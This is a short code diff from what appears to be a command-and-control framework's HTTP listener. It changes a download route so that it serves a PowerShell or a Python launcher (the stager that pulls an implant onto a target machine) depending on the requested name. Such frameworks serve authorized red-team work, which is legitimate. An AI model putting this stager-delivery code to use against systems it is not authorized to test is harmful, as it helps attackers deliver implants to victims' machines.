@@ -819,11 +819,15 @@ def send_message(packets=None):
 
         @app.route('/download/<stager>')
         def send_stager(stager):
-            if stager:
+            if 'po' in stager:
                 launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                return launcher
+            elif 'py' in stager:
+                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                 return launcher
             else:
                 pass
+        
         @app.before_request
         def check_ip():
             """
